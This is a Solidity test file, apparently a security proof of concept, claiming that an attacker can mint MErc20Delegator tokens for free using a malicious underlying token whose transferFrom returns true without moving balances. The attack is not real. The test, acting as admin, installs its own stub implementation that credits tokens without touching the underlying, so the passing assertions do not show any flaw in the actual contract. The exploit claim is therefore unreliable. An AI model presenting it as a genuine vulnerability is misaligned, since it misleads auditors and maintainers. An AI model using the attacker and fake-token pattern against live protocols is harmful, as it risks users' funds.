// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.5.17;
pragma experimental ABIEncoderV2;

import "../lib/ds-test/test.sol";
import "../src/MErc20Delegator.sol";
import "../src/ComptrollerInterface.sol";
import "../src/InterestRateModel.sol";

/*
PoC test (final):
- Deploy DummyImplementation (provides no-op _become/_resign) so delegator constructor succeeds.
- Deploy MErc20Delegator with DummyImplementation as initial implementation.
- Deploy PoCImplementation (real mint/balance logic).
- Call token._setImplementation(poCImpl, true, "") as admin to switch implementation.
- Use MaliciousUnderlying (transferFrom returns true without changing balances).
- Attacker calls delegator.mint(amount) via a contract; mint should succeed and update proxy storage.
- Verify mToken balance increased and underlying balance unchanged.
*/

contract PermissiveComptroller {
    bool public constant isComptroller = true;

    // enterMarkets must return a uint[] in memory for 0.5.17 callers
    function enterMarkets(address[] memory) public returns (uint[] memory) {
        uint[] memory results = new uint[](1);
        results[0] = 0;
        return results;
    }

    function mintAllowed(address, address, uint256) external view returns (uint256) { return 0; }
    function redeemAllowed(address, address, uint256) external view returns (uint256) { return 0; }
    function borrowAllowed(address, address, uint256) external view returns (uint256) { return 0; }
    function repayBorrowAllowed(address, address, address, uint256) external view returns (uint256) { return 0; }
    function liquidateBorrowAllowed(address, address, address, uint256) external view returns (uint256) { return 0; }
    function seizeAllowed(address, address, address, uint256) external view returns (uint256) { return 0; }
    function transferAllowed(address, address, address, uint256) external view returns (uint256) { return 0; }

    function mintVerify(address, address, uint256, uint256) external pure {}
    function redeemVerify(address, address, uint256, uint256) external pure {}
    function borrowVerify(address, address, uint256) external pure {}
    function repayBorrowVerify(address, address, address, uint256, uint256) external pure {}
    function liquidateBorrowVerify(address, address, address, uint256, uint256) external pure {}
    function seizeVerify(address, address, address, uint256, uint256) external pure {}
    function transferVerify(address, address, address, uint256, uint256) external pure {}
}

/* Minimal IRM stub */
contract DummyIRM is InterestRateModel {
    function getBorrowRate(uint, uint, uint) external view returns (uint) { return 0; }
    function getSupplyRate(uint, uint, uint, uint) external view returns (uint) { return 0; }
}

/* Malicious underlying: transferFrom returns true but DOES NOT reduce balances. */
contract MaliciousUnderlying {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() public {}

    function mintTo(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    // BUG: does NOT reduce balanceOf[from], but returns true.
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        // simulate success but DO NOT change balances
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (balanceOf[msg.sender] < amount) return false;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/* DummyImplementation:
   Minimal implementation with no-op _becomeImplementation/_resignImplementation and stub mint/balance.
   Used only as initial implementation so delegator constructor delegateToImplementation(...) won't revert.
*/
contract DummyImplementation {
    // exact ABI expected by delegator's constructor `delegateToImplementation("_becomeImplementation(bytes)", data)`
    function _becomeImplementation(bytes calldata /*data*/) external {
        // no-op, must NOT revert
    }

    // exact ABI expected when delegator calls _resignImplementation on previous impl
    function _resignImplementation() external {
        // no-op, must NOT revert
    }

    // stubs for mint/balanceOf used during construction or tests
    function mint(uint256) external returns (uint256) { return 0; }
    function balanceOf(address) external view returns (uint256) { return 0; }

    // fallback to accept unexpected calls (should not revert)
    function() external payable {
        // accept and do nothing
    }
}


/*
PoCImplementation:
- Keeps mapping `accountTokens` and implements _become/_resign, mint, balanceOf.
- When delegator delegatecalls into it, storage writes happen into the delegator storage (proxy),
  so balanceOf via proxy will read values written by mint called through the proxy.
*/
contract PoCImplementation {
    mapping(address => uint256) public accountTokens;

    function _becomeImplementation(bytes memory) public {
        // accept init data (no-op)
        bytes memory b = bytes("");
        if (b.length == 0) { b = b; } // silence unused variable warning
    }

    function _resignImplementation() public {
        // no-op
    }

    function mint(uint256 mintAmount) external returns (uint256) {
        // credit msg.sender with minted tokens (in delegatecall context this writes to proxy storage)
        accountTokens[msg.sender] = accountTokens[msg.sender] + mintAmount;
        return 0;
    }

    function balanceOf(address owner) external view returns (uint256) {
        return accountTokens[owner];
    }
}

/* Attacker contract that calls mint on the delegator */
contract Attacker {
    function doMint(address delegator, uint256 amount) public returns (bool) {
        (bool ok, ) = delegator.call(abi.encodeWithSignature("mint(uint256)", amount));
        return ok;
    }

    function balanceOfMToken(address delegator, address who) public view returns (uint256) {
        (bool ok, bytes memory ret) = delegator.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        require(ok);
        return abi.decode(ret, (uint256));
    }
}

contract MintPoCTest is DSTest {
    MErc20Delegator token;
    MaliciousUnderlying underlying;
    PermissiveComptroller comptroller;
    DummyIRM irm;
    Attacker attacker;

    function setUp() public {
        comptroller = new PermissiveComptroller();
        irm = new DummyIRM();
        attacker = new Attacker();

        // deploy malicious underlying and mint some "underlying" to attacker
        underlying = new MaliciousUnderlying();
        underlying.mintTo(address(this), 1000 ether);
        underlying.mintTo(address(attacker), 1000 ether);

        // deploy DummyImplementation and use it as initial implementation to avoid ctor revert
        DummyImplementation dummy = new DummyImplementation();
        address dummyAddr = address(dummy);

        token = new MErc20Delegator(
            address(underlying),
            ComptrollerInterface(address(comptroller)),
            InterestRateModel(address(irm)),
            1e18,
            "SecToken",
            "STK",
            18,
            address(uint160(address(this))), // admin = test contract
            address(0x1234567890000000000000000000000000000000),
            "" // becomeImplementationData
        );

        // now deploy PoC implementation and set as the new implementation via admin call
        PoCImplementation impl = new PoCImplementation();
        token._setImplementation(address(impl), true, "");

        // attacker approves token although transferFrom ignores balances
        (bool ok1, ) = address(underlying).call(abi.encodeWithSignature("approve(address,uint256)", address(token), uint256(1000 ether)));
        ok1;
    }

    function test_attacker_can_free_mint_via_mint_wrapper() public {
        uint beforeUnderlying = underlying.balanceOf(address(attacker));

        bool ok = attacker.doMint(address(token), 100 ether);
        assertTrue(ok);

        // check mToken balance via delegator wrapper -> delegateToViewImplementation -> implementation.balanceOf
        (bool ok2, bytes memory ret) = address(token).staticcall(abi.encodeWithSignature("balanceOf(address)", address(attacker)));
        require(ok2);
        uint mBal = abi.decode(ret, (uint256));

        uint afterUnderlying = underlying.balanceOf(address(attacker));

        emit log_named_uint("mToken balance after mint (attacker)", mBal);
        emit log_named_uint("underlying balance before", beforeUnderlying);
        emit log_named_uint("underlying balance after", afterUnderlying);

        // underlying must be unchanged (malicious underlying didn't deduct), and mToken balance must increase
        assertTrue(afterUnderlying == beforeUnderlying);
        assertTrue(mBal > 0);
    }
}
